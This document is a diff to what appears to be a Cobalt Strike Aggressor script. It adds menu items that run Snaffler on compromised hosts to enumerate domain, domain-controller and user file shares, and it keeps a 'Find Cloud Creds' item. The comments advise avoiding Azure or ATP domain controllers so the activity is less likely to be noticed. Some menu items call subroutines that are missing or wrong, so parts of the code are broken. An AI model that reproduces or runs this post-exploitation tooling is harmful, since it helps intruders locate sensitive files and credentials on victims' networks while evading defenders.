@@ -278,11 +278,102 @@ menu "ACL Checks"
 }
 #################################################
 
-#   Find Files
+#   File and Share Enumeration
 
 #################################################
-menu "Find Files"
+menu "File And Share Enumeration"
 {
+
+#################################################
+#   Snaffler - SubMenu
+#################################################
+menu "Snaffler"{
+
+
+########################
+#Find All Shares
+########################
+item "Display All Available Shares (Noisy) - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            findallshares($bid);
+      }
+   }
+
+########################
+#Find Shares - Specify Domain
+########################
+item "Display All Available Shares Based On Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomainshares($bid);
+      }
+   }
+########################
+#Find Shares - Specify DC
+########################
+item "Display All Available Shares Based On DC - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrollershares($bid);
+      }
+   }
+########################
+#Find Shares - Specify DC & Domain
+########################
+item "Display All Available Shares Based On DC And Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrolleranddomainshares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration All
+########################
+item "Display All Available User Shares (Noisy) - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserallshares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration & Specify Domain
+########################
+item "Display All Available User Shares Based On Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserdomainshares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration Specify Domain Controller
+########################
+item "Display All User Available Shares Based On Domain Controller - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrollershares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration Specify Domain Controller & Domain
+########################
+item "Display All Available Shares Based On Domain Controller & Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserdomaincontrolleranddomainshares($bid);
+      }
+   }
+} #End Snaffler Menu
+
+
+
 #Find Cloud Credential Files
 item "Find Cloud Creds"{
 	local('$bid');
@@ -720,9 +811,86 @@ bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-ObjectAcl -
 
 #################################################
 
-#   Find Files
+#   File/Share Enumeration
 
 #################################################
+
+
+#################################################
+#   Snaffler
+#################################################
+sub findallshares{
+bexecute_assembly($1, script_resource("/exe/Snaffler.exe"), "-s -j 75 -v data");
+}
+
+sub finddomainshares{
+prompt_text("Insert Domain Name", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -d $1 -v data");
+}, $bids => $1));
+}
+
+sub finddomaincontrollershares{
+prompt_text("Insert DomainController", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -c $1 -v data");
+}, $bids => $1));
+}
+
+#sub finddomaincontrolleranddomainshares{
+#    $bid = $1;
+#    $dialog = dialog("DC and Domain Shares", %(interval => "", filteruser => "", execmethod => "Execute-Assembly"), lambda({
+#        $cmdargs = "";
+#        $cmdargs = "monitor /interval:$3['interval'] /filteruser:$3['filteruser']";
+#        if ($3["execmethod"] eq "Execute-Assembly"){
+#            btask($bid, 'Begin Monitoring for logons');
+#            bexecute_assembly($bid, script_resource('/exe/Snaffler.exe'), $cmdargs);
+#        }
+#    }));
+#    dialog_description($dialog, "This will help automate the process of abusing unconstrained delegation - 5 is a good interval FWIW");
+#    drow_text($dialog, "interval",  "Please Enter Domain Name:");
+#    drow_text($dialog, "filteruser",  "Please Enter DC FQDN:");
+#    dbutton_action($dialog, "Run");
+#    dialog_show($dialog);
+#}
+
+#prompt_text("Insert Domain Name", "", lambda({
+#bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -d $1 -v data");
+#}, $bids => $1));
+#}
+
+sub finduserallshares{
+bexecute_assembly($1, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -v data");
+}
+
+sub finduserdomainshares{
+prompt_text("Insert Domain Name", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -d $1 -v data");
+}, $bids => $1));
+}
+
+sub finduserdomaincontrollershares{
+prompt_text("Insert DomanController", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -c $1 -v data");
+}, $bids => $1));
+}
+
+#sub finddomaincontrolleranddomainshares{
+#prompt_text("Insert Domain Name", "", lambda({
+#bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -d $1 -v data");
+#}, $bids => $1));
+#}
+
+##Share Only Enum
+#"Snaffler.exe -s -j 75 -v data" - Will be at top of menu, this will show all the things and will be noisy
+#Snaffler.exe -s -j 75 -d "$DOMAIN" -v data Will be second item menu, will need to pop up and have user enter domain name
+#Snaffler.exe -s -j 75 -c "$DOMAINCONTROLLER" -v data Specify which domain controller (OPSEC) - try not to hit Azure or ATP DC's - PDC is preferred
+#Snaffler.exe -s -j 75 -c "$DOMAINCONTROLLER" -d "$DOMAIN" -v data Specify which domain controller (OPSEC) and Domain - try not to hit Azure or ATP DC's - PDC is preferred
+##User Enum
+#Snaffler.exe -s -u -j 75-v data" - Will be at top of menu, this will show all the things and will be noisy (Added user switch)
+#Snaffler.exe -s -u -j 75 -d "$DOMAIN" -v data Will be second item menu, will need to pop up and have user enter domain name (Added user switch)
+#Snaffler.exe -s -u -j 75 -c "$DOMAINCONTROLLER" -v data Specify which domain controller (OPSEC) - try not to hit Azure or ATP DC's - PDC is preferred (Added user switch)
+#Snaffler.exe -s -u -j 75 -c "$DOMAINCONTROLLER" -d "$DOMAIN" -v data Specify which domain controller (OPSEC) and Domain - try not to hit Azure or ATP DC's - PDC is preferred (Added user switch)
+
+
 
 # Cloud Creds
 sub cloudcreds{
